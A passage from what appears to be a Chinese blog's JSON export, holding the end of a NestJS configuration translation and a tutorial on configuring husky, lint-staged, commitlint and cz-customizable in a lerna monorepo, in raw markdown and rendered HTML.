title=\"可扩展变量\"></a>可扩展变量</h2><p><code>@nestjsconfig</code>支持环境变量扩展。通过这种技术，你可以创建嵌套的环境变量，其中一个变量被引用到另一个变量的定义中。比如说</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">APP_URL=mywebsite.com</span><br><span class=\"line\">SUPPORT_EMAIL=support@$&#123;APP_URL&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过这种结构，变量<code>SUPPORT_EMAIL</code>解析为<code>support@mywebsite.com</code>。请注意使用 <code>$&#123;...&#125;</code> 语法来触发解析 <code>SUPPORT_EMAIL</code> 定义中的变量 <code>APP_URL</code> 的值。</p>\n<blockquote>\n<p>对于这个功能，<code>@nestjsconfig</code>包内部使用<code>dotenv-expand</code>。</p>\n</blockquote>\n<p>使用传递给<code>ConfigModule</code>的<code>forRoot()</code>方法的选项对象中的<code>expandVariables</code>属性启用环境变量扩展，如下所示。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  <span class=\"attr\">imports</span>: [</span><br><span class=\"line\">    <span class=\"title class_\">ConfigModule</span>.<span class=\"title function_\">forRoot</span>(&#123;</span><br><span class=\"line\">      <span class=\"comment\">// ...</span></span><br><span class=\"line\">      <span class=\"attr\">expandVariables</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">  ],</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AppModule</span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"在-main-ts-中使用\"><a href=\"#在-main-ts-中使用\" class=\"headerlink\" title=\"在 main.ts 中使用\"></a>在 <code>main.ts</code> 中使用</h2><p>虽然我们的配置是存储在service中的，但它仍然可以在<code>main.ts</code>文件中使用。这样，你就可以用它来存储变量，如应用程序端口或CORS host。</p>\n<p>要访问它，你必须使用<code>app.get()</code>方法，然后是服务引用。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> configService = app.<span class=\"title function_\">get</span>(<span class=\"title class_\">ConfigService</span>);</span><br></pre></td></tr></table></figure>\n\n<p>然后，你可以像往常一样，通过调用配置键的get方法来使用它。</p>\n<figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> port = configService.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;PORT&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>本文基本上是官文文档中有关配置部分的中文翻译（<a href=\"https://docs.nestjs.com/techniques/configuration%EF%BC%89%EF%BC%8C%E6%9C%89%E6%97%B6%E9%97%B4%E5%86%8D%E5%86%99%E4%B8%AA%E5%AE%9E%E6%88%98%E6%96%87%E7%AB%A0%E3%80%82\">https://docs.nestjs.com/techniques/configuration），有时间再写个实战文章。</a></p>\n</blockquote>"},{"title":"lerna项目中集成husky、lint-staged、commitlint和cz-customizable","date":"2021-04-02T15:07:17.000Z","_content":"\nMonorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。\n\n<!-- more -->\n\n\n## 说明\n\n重要package版本说明：\n\n- \"husky\": \"^6.0.0\"\n- \"lint-staged\": \"^10.5.4\"\n- \"@commitlint/cli\": \"^12.0.1\"\n- \"@commitlint/config-conventional\": \"^12.0.1\"\n- \"cz-customizable\": \"^6.3.0\"\n\n\n## 配置husky\n\n在lerna项目根目录中安装`husky`:\n\n```bash\nyarn add husky -D\n```\n\n> 注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍\n\n1. 在`package.json`的`scripts`中添加`\"prepare\": \"husky install\"`，并运行这条命令：\n\n```bash\nnpm set-script prepare \"husky install\" && npm run prepare\n```\n\n2. 添加一个hook:\n\n```bash\nnpx husky add .husky/pre-commit \"npm test\"\n```\n\n上面这个命令会在`.husky`目录下新建一个`pre-commit`文件，其内容如下：\n\n```bash\n#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n\nnpm test\n\n```\n\n以上都是手动安装`husky`的过程，当然官方也提供了一键安装和配置脚本，推荐使用：\n\n```bash\nnpx husky-init && npm install       # npm\nnpx husky-init && yarn              # Yarn 1\nyarn dlx husky-init --yarn2 && yarn # Yarn 2\n```\n\n如果使用的是v4版本的`husky`，想升级到v6，可以使用以下命名，一键迁移：\n\n```bash\n// npm\nnpm install husky@6 --save-dev \\\n  && npx husky-init \\\n  && npm exec -- github:typicode/husky-4-to-6 --remove-v4-config\n  \n// yarn 1\nyarn add husky@6 --dev \\\n  && npx husky-init \\\n  && npm exec -- github:typicode/husky-4-to-6 --remove-v4-config\n\n// yarn 2\nyarn add husky@6 --dev \\\n  && yarn dlx husky-init --yarn2 \\\n  && npm exec -- github:typicode/husky-4-to-6 --remove-v4-config\n```\n\n> 更多配置，详见官方文档：https://typicode.github.io/husky/#/\n\n\n## 配置lint-staged\n\n\n在`lerna`项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录；\n\n而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 `lint-staged` 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。\n\n这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 `lint-staged` 就需要安装在任何一个需要做校验的子项目中。\n\n1. 添加或修改`.husky`目录下的`pre-commit`钩子如下：\n\n```\n#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n\nlerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents\n\n```\n\n\n其中，`precommit` 是在`pre-commit`钩子中触发的子项目的命令\n\n2. 在子项目中安装和配置`lint-staged`，并添加`precommit`命令\n\n- 安装`lint-staged`：\n\n```bash\nlerna add lint-staged --scope=xxxx -D\n```\n\n\n- 在添加`precommit`命令：\n\n```\n\"precommit\": \"lint-staged\"\n```\n\n- 配置`lint-staged`：\n\n```json\n\"lint-staged\": {\n  \"*.{ts,tsx,js,jsx}\": [\n    \"eslint\"\n  ]\n},\n```\n\n> 更多配置，详见官方文档：https://github.com/okonet/lint-staged#readme\n\n\n## 配置commitlint和cz-customizable\n\n\n每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。\n\n`cz-customizable`是一个帮助书写commit message的工具，而`commitlint`是一个校验commit message的工具。\n\n1. 安装`commitlint`和`cz-customizable`:\n\n```bash\nyarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D\n```\n\n2. 添加`commit-msg`钩子\n\n```bash\nnpx husky add .husky/commit-msg \"yarn commitlint --edit\"\n```\n\n生成如下文件：\n\n\n```bash\n#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n\nyarn commitlint --edit \n```\n\n3. 在`package.json`中添加以下配置：\n\n```json\n{\n  ...\n  \"config\": {\n    \"commitizen\": {\n      \"path\": \"./node_modules/cz-customizable\"\n    },\n    \"cz-customizable\": {\n      \"config\": \"./.cz-config.js\"\n    }\n  },\n  ...\n}\n```\n\n4. 在项目根目录中新建`.cz-config.js`文件，内容如下：\n\n```js\nmodule.exports = {\n  types: [\n    { value: 'feat', name: 'feat:     A new feature' },\n    { value: 'fix', name: 'fix:      A bug fix' },\n    {\n      value: 'style',\n      name:\n        'style:    Changes that do not affect the meaning of the code\\n            (white-space, formatting, missing semi-colons, etc)',\n    },\n    {\n      value: 'refactor',\n      name:\n        'refactor: A code change that neither fixes a bug nor adds a feature',\n    },\n    { value: 'revert', name: 'revert:   Revert to a commit' },\n    {\n      value: 'chore',\n      name:\n        'chore:    Changes to the build process or auxiliary tools\\n            and libraries such as documentation generation',\n    },\n    { value: 'docs', name: 'docs:     Documentation only changes' },\n    {\n      value: 'perf',\n      name: 'perf:     A code change that improves performance',\n    },\n    { value: 'test', name: 'test:     Adding missing tests' },\n  ],\n\n  scopes: [\n    { name: 'frontend' },\n    { name: 'backend' },\n    { name: 'service' },\n  ],\n\n  messages: {\n    type: \"Select the type of change that you're committing:\",\n    scope: \"\\n Select the scope of change that you're committing:\",\n    // used if allowCustomScopes is true\n    customScope: 'Denote the custom scope:',\n    subject: 'Write a SHORT, IMPERATIVE tense description of the change:\\n',\n    body:\n      'Provide a LONGER description of the change (optional). Use \"|\" to break new line:\\n',\n    breaking: 'List any BREAKING CHANGES (optional):\\n',\n    footer:\n      'List any ISSUES CLOSED by this change (optional). E.g.: #31, #34:\\n',\n    confirmCommit: 'Are you sure you want to proceed with the commit above?',\n  },\n\n  allowCustomScopes: true,\n}\n\n```\n\n5. 在项目根目录中新建`.commitlintrc.js`文件，内容如下：\n\n```js\nconst typeEnum = require('./.cz-config');\n\nmodule.exports = {\n  extends: ['@commitlint/config-conventional'],\n  rules: {\n    'type-enum': [2, 'always', typeEnum.types.map((i) => i.value)],\n    'scope-enum': [2, 'always', typeEnum.scopes.map((i) => i.name)],\n    'scope-empty': [2, 'never'],\n  },\n};\n\n```\n\n\n配置完成后，每次提交commit时，可以使用`git cz`替换`git commit`命令，从而辅助我们更加规范的书写commit message。\n\n> 更多详细配置，可以参考这篇文章：https://juejin.cn/post/6844903831893966856\n\n## 总结\n\n以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。\n\n## 链接\n\n- [husky官文文档](https://typicode.github.io/husky/#/)\n\n- [lint-staged官方文档](https://typicode.github.io/husky/#/)\n\n- [Cz工具集使用介绍](https://juejin.cn/post/6844903831893966856)\n","source":"_posts/lerna项目中集成husky、lint-staged、commitlint和cz-customizable.md","raw":"---\ntitle: lerna项目中集成husky、lint-staged、commitlint和cz-customizable\ndate: 2021-04-02 23:07:17\ntags:\n---\n\nMonorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。\n\n<!-- more -->\n\n\n## 说明\n\n重要package版本说明：\n\n- \"husky\": \"^6.0.0\"\n- \"lint-staged\": \"^10.5.4\"\n- \"@commitlint/cli\": \"^12.0.1\"\n- \"@commitlint/config-conventional\": \"^12.0.1\"\n- \"cz-customizable\": \"^6.3.0\"\n\n\n## 配置husky\n\n在lerna项目根目录中安装`husky`:\n\n```bash\nyarn add husky -D\n```\n\n> 注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍\n\n1. 在`package.json`的`scripts`中添加`\"prepare\": \"husky install\"`，并运行这条命令：\n\n```bash\nnpm set-script prepare \"husky install\" && npm run prepare\n```\n\n2. 添加一个hook:\n\n```bash\nnpx husky add .husky/pre-commit \"npm test\"\n```\n\n上面这个命令会在`.husky`目录下新建一个`pre-commit`文件，其内容如下：\n\n```bash\n#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n\nnpm test\n\n```\n\n以上都是手动安装`husky`的过程，当然官方也提供了一键安装和配置脚本，推荐使用：\n\n```bash\nnpx husky-init && npm install       # npm\nnpx husky-init && yarn              # Yarn 1\nyarn dlx husky-init --yarn2 && yarn # Yarn 2\n```\n\n如果使用的是v4版本的`husky`，想升级到v6，可以使用以下命名，一键迁移：\n\n```bash\n// npm\nnpm install husky@6 --save-dev \\\n  && npx husky-init \\\n  && npm exec -- github:typicode/husky-4-to-6 --remove-v4-config\n  \n// yarn 1\nyarn add husky@6 --dev \\\n  && npx husky-init \\\n  && npm exec -- github:typicode/husky-4-to-6 --remove-v4-config\n\n// yarn 2\nyarn add husky@6 --dev \\\n  && yarn dlx husky-init --yarn2 \\\n  && npm exec -- github:typicode/husky-4-to-6 --remove-v4-config\n```\n\n> 更多配置，详见官方文档：https://typicode.github.io/husky/#/\n\n\n## 配置lint-staged\n\n\n在`lerna`项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录；\n\n而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 `lint-staged` 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。\n\n这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 `lint-staged` 就需要安装在任何一个需要做校验的子项目中。\n\n1. 添加或修改`.husky`目录下的`pre-commit`钩子如下：\n\n```\n#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n\nlerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents\n\n```\n\n\n其中，`precommit` 是在`pre-commit`钩子中触发的子项目的命令\n\n2. 在子项目中安装和配置`lint-staged`，并添加`precommit`命令\n\n- 安装`lint-staged`：\n\n```bash\nlerna add lint-staged --scope=xxxx -D\n```\n\n\n- 在添加`precommit`命令：\n\n```\n\"precommit\": \"lint-staged\"\n```\n\n- 配置`lint-staged`：\n\n```json\n\"lint-staged\": {\n  \"*.{ts,tsx,js,jsx}\": [\n    \"eslint\"\n  ]\n},\n```\n\n> 更多配置，详见官方文档：https://github.com/okonet/lint-staged#readme\n\n\n## 配置commitlint和cz-customizable\n\n\n每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。\n\n`cz-customizable`是一个帮助书写commit message的工具，而`commitlint`是一个校验commit message的工具。\n\n1. 安装`commitlint`和`cz-customizable`:\n\n```bash\nyarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D\n```\n\n2. 添加`commit-msg`钩子\n\n```bash\nnpx husky add .husky/commit-msg \"yarn commitlint --edit\"\n```\n\n生成如下文件：\n\n\n```bash\n#!/bin/sh\n. \"$(dirname \"$0\")/_/husky.sh\"\n\nyarn commitlint --edit \n```\n\n3. 在`package.json`中添加以下配置：\n\n```json\n{\n  ...\n  \"config\": {\n    \"commitizen\": {\n      \"path\": \"./node_modules/cz-customizable\"\n    },\n    \"cz-customizable\": {\n      \"config\": \"./.cz-config.js\"\n    }\n  },\n  ...\n}\n```\n\n4. 在项目根目录中新建`.cz-config.js`文件，内容如下：\n\n```js\nmodule.exports = {\n  types: [\n    { value: 'feat', name: 'feat:     A new feature' },\n    { value: 'fix', name: 'fix:      A bug fix' },\n    {\n      value: 'style',\n      name:\n        'style:    Changes that do not affect the meaning of the code\\n            (white-space, formatting, missing semi-colons, etc)',\n    },\n    {\n      value: 'refactor',\n      name:\n        'refactor: A code change that neither fixes a bug nor adds a feature',\n    },\n    { value: 'revert', name: 'revert:   Revert to a commit' },\n    {\n      value: 'chore',\n      name:\n        'chore:    Changes to the build process or auxiliary tools\\n            and libraries such as documentation generation',\n    },\n    { value: 'docs', name: 'docs:     Documentation only changes' },\n    {\n      value: 'perf',\n      name: 'perf:     A code change that improves performance',\n    },\n    { value: 'test', name: 'test:     Adding missing tests' },\n  ],\n\n  scopes: [\n    { name: 'frontend' },\n    { name: 'backend' },\n    { name: 'service' },\n  ],\n\n  messages: {\n    type: \"Select the type of change that you're committing:\",\n    scope: \"\\n Select the scope of change that you're committing:\",\n    // used if allowCustomScopes is true\n    customScope: 'Denote the custom scope:',\n    subject: 'Write a SHORT, IMPERATIVE tense description of the change:\\n',\n    body:\n      'Provide a LONGER description of the change (optional). Use \"|\" to break new line:\\n',\n    breaking: 'List any BREAKING CHANGES (optional):\\n',\n    footer:\n      'List any ISSUES CLOSED by this change (optional). E.g.: #31, #34:\\n',\n    confirmCommit: 'Are you sure you want to proceed with the commit above?',\n  },\n\n  allowCustomScopes: true,\n}\n\n```\n\n5. 在项目根目录中新建`.commitlintrc.js`文件，内容如下：\n\n```js\nconst typeEnum = require('./.cz-config');\n\nmodule.exports = {\n  extends: ['@commitlint/config-conventional'],\n  rules: {\n    'type-enum': [2, 'always', typeEnum.types.map((i) => i.value)],\n    'scope-enum': [2, 'always', typeEnum.scopes.map((i) => i.name)],\n    'scope-empty': [2, 'never'],\n  },\n};\n\n```\n\n\n配置完成后，每次提交commit时，可以使用`git cz`替换`git commit`命令，从而辅助我们更加规范的书写commit message。\n\n> 更多详细配置，可以参考这篇文章：https://juejin.cn/post/6844903831893966856\n\n## 总结\n\n以上就是我对如何在lerna项目中配置husky、lint-staged和Cz工具的一些粗略认知，当然不仅仅是lerna项目，也适用于任何前端项目。\n\n## 链接\n\n- [husky官文文档](https://typicode.github.io/husky/#/)\n\n- [lint-staged官方文档](https://typicode.github.io/husky/#/)\n\n- [Cz工具集使用介绍](https://juejin.cn/post/6844903831893966856)\n","slug":"lerna项目中集成husky、lint-staged、commitlint和cz-customizable","published":1,"updated":"2022-03-06T08:41:46.709Z","_id":"cl0eyp64x0002hommcgok0u4n","comments":1,"layout":"post","photos":[],"link":"","content":"<html><head></head><body><p>Monorepo 是针对单仓库、多 package 的流行解决方案, lerna 是它的一种实现。</p>\n<span id=\"more\"></span>\n\n\n<h2 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h2><p>重要package版本说明：</p>\n<ul>\n<li>“husky”: “^6.0.0”</li>\n<li>“lint-staged”: “^10.5.4”</li>\n<li>“@commitlint/cli”: “^12.0.1”</li>\n<li>“@commitlint/config-conventional”: “^12.0.1”</li>\n<li>“cz-customizable”: “^6.3.0”</li>\n</ul>\n<h2 id=\"配置husky\"><a href=\"#配置husky\" class=\"headerlink\" title=\"配置husky\"></a>配置husky</h2><p>在lerna项目根目录中安装<code>husky</code>:</p>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yarn add husky -D</span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>注意：husky v4和v6版本的配置方式大相径庭，这里只介绍v6版本的配置方式，v4的网上一搜一大把，这里不过多介绍</p>\n</blockquote>\n<ol>\n<li>在<code>package.json</code>的<code>scripts</code>中添加<code>\"prepare\": \"husky install\"</code>，并运行这条命令：</li>\n</ol>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm set-script prepare <span class=\"hljs-string\">\"husky install\"</span> &amp;&amp; npm run prepare</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>添加一个hook:</li>\n</ol>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx husky add .husky/pre-commit <span class=\"hljs-string\">\"npm test\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>上面这个命令会在<code>.husky</code>目录下新建一个<code>pre-commit</code>文件，其内容如下：</p>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">#!/bin/sh</span></span><br><span class=\"line\">. <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(dirname <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$0</span>\"</span>)</span>/_/husky.sh\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">npm <span class=\"hljs-built_in\">test</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>以上都是手动安装<code>husky</code>的过程，当然官方也提供了一键安装和配置脚本，推荐使用：</p>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx husky-init &amp;&amp; npm install       <span class=\"hljs-comment\"># npm</span></span><br><span class=\"line\">npx husky-init &amp;&amp; yarn              <span class=\"hljs-comment\"># Yarn 1</span></span><br><span class=\"line\">yarn dlx husky-init --yarn2 &amp;&amp; yarn <span class=\"hljs-comment\"># Yarn 2</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>如果使用的是v4版本的<code>husky</code>，想升级到v6，可以使用以下命名，一键迁移：</p>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// npm</span><br><span class=\"line\">npm install husky@6 --save-dev \\</span><br><span class=\"line\">  &amp;&amp; npx husky-init \\</span><br><span class=\"line\">  &amp;&amp; npm <span class=\"hljs-built_in\">exec</span> -- github:typicode/husky-4-to-6 --remove-v4-config</span><br><span class=\"line\">  </span><br><span class=\"line\">// yarn 1</span><br><span class=\"line\">yarn add husky@6 --dev \\</span><br><span class=\"line\">  &amp;&amp; npx husky-init \\</span><br><span class=\"line\">  &amp;&amp; npm <span class=\"hljs-built_in\">exec</span> -- github:typicode/husky-4-to-6 --remove-v4-config</span><br><span class=\"line\"></span><br><span class=\"line\">// yarn 2</span><br><span class=\"line\">yarn add husky@6 --dev \\</span><br><span class=\"line\">  &amp;&amp; yarn dlx husky-init --yarn2 \\</span><br><span class=\"line\">  &amp;&amp; npm <span class=\"hljs-built_in\">exec</span> -- github:typicode/husky-4-to-6 --remove-v4-config</span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>更多配置，详见官方文档：<a href=\"https://typicode.github.io/husky/#/\">https://typicode.github.io/husky/#/</a></p>\n</blockquote>\n<h2 id=\"配置lint-staged\"><a href=\"#配置lint-staged\" class=\"headerlink\" title=\"配置lint-staged\"></a>配置lint-staged</h2><p>在<code>lerna</code>项目中，由于所有子项目公用一个 repo 源代码仓库，因此它的 husky 钩子只能建立在最顶层目录；</p>\n<p>而每次 commit 都很有可能是多个子项目都有改动，这个时候使用 <code>lint-staged</code> 时，就不但要区分文件类型，还要区分改动文件所在的子项目（因为不同的子项目可能会有不同的校验处理）。</p>\n<p>这时，我们可以使用 lerna 命令来实现对“哪个子项目有修改”的判断；而 <code>lint-staged</code> 就需要安装在任何一个需要做校验的子项目中。</p>\n<ol>\n<li>添加或修改<code>.husky</code>目录下的<code>pre-commit</code>钩子如下：</li>\n</ol>\n<figure class=\"highlight plaintext hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\">. \"$(dirname \"$0\")/_/husky.sh\"</span><br><span class=\"line\"></span><br><span class=\"line\">lerna run --concurrency 1 --stream precommit --since HEAD --exclude-dependents</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n\n<p>其中，<code>precommit</code> 是在<code>pre-commit</code>钩子中触发的子项目的命令</p>\n<ol start=\"2\">\n<li>在子项目中安装和配置<code>lint-staged</code>，并添加<code>precommit</code>命令</li>\n</ol>\n<ul>\n<li>安装<code>lint-staged</code>：</li>\n</ul>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lerna add lint-staged --scope=xxxx -D</span><br></pre></td></tr></tbody></table></figure>\n\n\n<ul>\n<li>在添加<code>precommit</code>命令：</li>\n</ul>\n<figure class=\"highlight plaintext hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\"precommit\": \"lint-staged\"</span><br></pre></td></tr></tbody></table></figure>\n\n<ul>\n<li>配置<code>lint-staged</code>：</li>\n</ul>\n<figure class=\"highlight json hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-attr\">\"lint-staged\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">{</span></span><br><span class=\"line\">  <span class=\"hljs-attr\">\"*.{ts,tsx,js,jsx}\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">[</span></span><br><span class=\"line\">    <span class=\"hljs-string\">\"eslint\"</span></span><br><span class=\"line\">  <span class=\"hljs-punctuation\">]</span></span><br><span class=\"line\"><span class=\"hljs-punctuation\">}</span><span class=\"hljs-punctuation\">,</span></span><br></pre></td></tr></tbody></table></figure>\n\n<blockquote>\n<p>更多配置，详见官方文档：<a href=\"https://github.com/okonet/lint-staged#readme\">https://github.com/okonet/lint-staged#readme</a></p>\n</blockquote>\n<h2 id=\"配置commitlint和cz-customizable\"><a href=\"#配置commitlint和cz-customizable\" class=\"headerlink\" title=\"配置commitlint和cz-customizable\"></a>配置commitlint和cz-customizable</h2><p>每个团队对提交的commit message格式有约定俗称的要求，但是没有一个统一的规范，导致大家提交的commit message或多或少不太一样。因此，需要一个工具来帮助大家统一commit message的格式，也方便后续的分析和拓展。</p>\n<p><code>cz-customizable</code>是一个帮助书写commit message的工具，而<code>commitlint</code>是一个校验commit message的工具。</p>\n<ol>\n<li>安装<code>commitlint</code>和<code>cz-customizable</code>:</li>\n</ol>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yarn add @commitlint/cli @commitlint/config-conventional cz-customizable -D</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>添加<code>commit-msg</code>钩子</li>\n</ol>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npx husky add .husky/commit-msg <span class=\"hljs-string\">\"yarn commitlint --edit\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>生成如下文件：</p>\n<figure class=\"highlight bash hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-meta\">#!/bin/sh</span></span><br><span class=\"line\">. <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(dirname <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$0</span>\"</span>)</span>/_/husky.sh\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">yarn commitlint --edit </span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>在<code>package.json</code>中添加以下配置：</li>\n</ol>\n<figure class=\"highlight json hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"hljs-punctuation\">{</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\">  <span class=\"hljs-attr\">\"config\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">{</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">\"commitizen\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">{</span></span><br><span class=\"line\">      <span class=\"hljs-attr\">\"path\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"./node_modules/cz-customizable\"</span></span><br><span class=\"line\">    <span class=\"hljs-punctuation\">}</span><span class=\"hljs-punctuation\">,</span></span><br><span class=\"line\">    <span class=\"hljs-attr\">\"cz-customizable\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-punctuation\">{</span></span><br><span class=\"line\">      <span class=\"hljs-attr\">\"config\"</span><span class=\"hljs-punctuation\">:</span> <span class=\"hljs-string\">\"./.cz-config.js\"</span></span><br><span class=\"line\">    <span class=\"hljs-punctuation\">}</span></span><br><span class=\"line\">  <span class=\"hljs-punctuation\">}</span><span class=\"hljs-punctuation\">,</span></span><br><span class=\"line\">  ...</span><br><span class=\"line\"><span class=\"hljs-punctuation\">}</span></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>在项目根目录中新建<code>.cz-config.js</code>文件，内容如下：</li>\n</ol>\n<figure class=\"highlight js hljs\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 